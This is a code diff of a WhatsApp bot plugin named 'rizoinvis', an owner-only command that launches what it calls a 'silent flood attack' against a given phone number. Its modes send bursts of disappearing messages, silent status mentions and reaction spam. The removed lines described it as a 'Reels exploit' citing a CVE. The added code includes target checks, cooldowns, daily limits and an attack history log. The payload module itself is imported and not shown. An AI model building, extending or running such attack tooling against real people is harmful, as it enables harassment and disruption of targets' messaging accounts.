@@ -1,105 +1,149 @@
 // plugins/rizoinvis.js
 const { cmd } = require('../arslan');
-const { Rizoinvis, CONFIG } = require('../lib/rizoinvis');
-const guard = require('../lib/rizoinvis_guard');
+const { Rizoinvis } = require('../lib/rizoinvis');
+
+const fs = require('fs');
+const path = require('path');
+let userConfig = {};
+try { userConfig = require('../config'); } catch (_) {}
+
+function clean(v) {
+    if (!v) return '';
+    let r = String(v).trim();
+    if (r.includes('@')) r = r.split('@')[0];
+    if (r.includes(':')) r = r.split(':')[0];
+    return r.replace(/[^0-9]/g, '');
+}
+
+const OWNERS = [
+    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
+    userConfig.OWNER_NUMBER
+].map(clean).filter(Boolean);
+
+const STATE_FILE = path.join(__dirname, '..', 'rizoinvis_state.json');
+const DEFAULTS = { protected: OWNERS, cooldownHours: 24, dailyLimit: 3, history: [], lastAt: 0 };
+
+function loadState() {
+    if (!fs.existsSync(STATE_FILE)) {
+        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
+        return { ...DEFAULTS };
+    }
+    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
+    catch (_) { return { ...DEFAULTS }; }
+}
+function saveState(s) {
+    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
+}
+function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }
+
+function checkTarget(target, botNum) {
+    const s = loadState();
+    if (target === botNum || (botNum && target.endsWith(botNum))) {
+        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
+    }
+    if (s.protected.includes(target)) {
+        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
+    }
+    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
+    if (last && hoursSince(last.ts) < s.cooldownHours) {
+        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
+        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
+    }
+    const today = new Date().toISOString().slice(0, 10);
+    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
+    if (t >= s.dailyLimit) {
+        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
+    }
+    return { ok: true };
+}
+
+function recordAttack(target, status) {
+    const s = loadState();
+    s.history.push({ target, ts: new Date().toISOString(), status });
+    if (status === 'success') s.lastAt = Date.now();
+    if (s.history.length > 500) s.history = s.history.slice(-500);
+    saveState(s);
+}
+
+function botNumFrom(conn) {
+    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+}
 
 cmd({
     pattern: 'rizoinvis',
-    alias: ['ri', 'invis', 'rizoinvisible', 'rizoinv'],
-    desc: 'RIZOINVIS — silent invisible Reels exploit (CVE-2026-23866, owner only)',
+    alias: ['ri', 'invis'],
+    desc: 'RIZOINVIS — silent flood attack (owner only)',
     category: 'owner',
     react: '👁️',
     filename: __filename,
     owner: true
 },
-async (conn, mek, m, { from, body, args, pushname, isCreator, reply }) => {
+async (conn, mek, m, { from, args, isCreator, reply }) => {
     try {
-        if (!isCreator) {
-            return reply('🔒 *Owner Only — RIZOINVIS Command!*');
-        }
+        if (!isCreator) return reply('🔒 *Owner Only*');
 
         if (!args[0]) {
             return reply(
-`📌 *Usage:* .rizoinvis 923xxxxxxxxx
+`👁️ *RIZOINVIS — Silent Attack*
 
-📖 *Example:* .rizoinvis 923001234567
+📌 *Usage:* .rizoinvis <number> [mode]
 
-👁️ RIZOINVIS Attack
-🎯 CVE-2026-23866 Reels exploit
-🔇 Silent + Invisible
-🛡 Self-protection active
-⏳ 72h per-target cooldown
-📊 Daily limit: 2`
+📖 *Modes:*
+• \`disappear\` — 30 disappearing messages
+• \`status\` — 10 silent status mentions
+• \`reaction\` — 20 reaction spam
+• \`all\` — all vectors (default)
+
+📖 *Examples:*
+.rizoinvis 923001234567 disappear
+.rizoinvis 923001234567 all
+
+🔇 Silent — no notifications
+⏳ 24h cooldown | 3/day`
             );
         }
 
-        const targetNumber = (args[0] || '').replace(/[^0-9]/g, '');
+        const num = String(args[0]).replace(/[^0-9]/g, '');
+        if (!num || num.length < 10) return reply('❌ *Invalid number!*');
 
-        if (!targetNumber || targetNumber.length < 10) {
-            return reply('❌ *Invalid number format!*');
-        }
+        const mode = (args[1] || 'all').toLowerCase();
 
-        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
-        const check = guard.checkTarget(targetNumber, botNum);
-
-        if (!check.ok) {
-            return reply(
-`${check.msg}
-
-🚫 Target: \`${targetNumber}\`
-📋 Reason: \`${check.reason}\``
-            );
-        }
-
-        const targetJid = targetNumber + '@s.whatsapp.net';
+        const check = checkTarget(num, botNumFrom(conn));
+        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${num}\`\n📋 ${check.reason}`);
 
         await reply(
 `👁️ *RIZOINVIS LOCKED*
-📱 Target : \`${targetNumber}\`
-🎯 Vector : CVE-2026-23866 Reels
-🔇 Silent  : ON
-👻 Invisible: ON
-🎭 Disguise: ${CONFIG.DISGUISE ? 'ON' : 'OFF'}
-🛡 Self-guard: active
+🎯 Target : \`${num}\`
+💥 Mode   : ${mode}
+🔇 Silent : ON
 ⚡ Launching...`
         );
 
         let lastPct = 0;
-        const result = await Rizoinvis(conn, targetJid, (sent, total, type) => {
-            const pct = Math.floor((sent / total) * 100);
+        const result = await Rizoinvis(conn, num, mode, (sent, total, type) => {
+            const pct = total > 0 ? Math.floor((sent / total) * 100) : 0;
             if (pct >= lastPct + 25) {
                 lastPct = pct;
-                conn.sendMessage(from, {
-                    text: `⏳ RIZOINVIS ${pct}% — last: *${type}* (${sent}/${total})`
-                }).catch(() => {});
+                conn.sendMessage(from, { text: `⏳ ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
             }
         });
 
         if (result.ok) {
-            guard.recordAttack(targetNumber, 'success');
-
-            await conn.sendMessage(from, {
-                react: { text: '👁️', key: mek.key }
-            });
-
-            const stats = guard.getStats();
+            recordAttack(num, 'success');
+            await conn.sendMessage(from, { react: { text: '👁️', key: mek.key } });
             return reply(
 `✅ *RIZOINVIS COMPLETE*
-🎯 Target : \`${targetNumber}\`
-📤 Sent   : \`${result.sent}\` payloads
-🎯 Vector : Reels + Rich
-🕒 ${new Date().toLocaleString()}
-
-📊 Today : ${stats.todayCount}/${stats.dailyLimit}
-⏳ Next attack in 90 min (global)`
+🎯 Target : \`${num}\`
+📤 Sent   : \`${result.sent}\` actions
+❌ Errors : \`${result.errors}\` (${result.errorRate})
+🎯 Vectors: ${result.vectors?.join(' + ') || mode}
+🕒 ${new Date().toLocaleString()}`
             );
         } else {
-            guard.recordAttack(targetNumber, 'failed:' + result.error);
-            return reply(`⚠️ *Partial failure:* ${result.error}`);
+            recordAttack(num, 'failed');
+            return reply(`⚠️ *Failed*`);
         }
-
     } catch (err) {
-        console.log('RIZOINVIS ERROR:', err);
-        return reply(`❌ *RIZOINVIS ERROR*\n\n${err.message}`);
+        return reply(`❌ ${err.message}`);
     }
 });
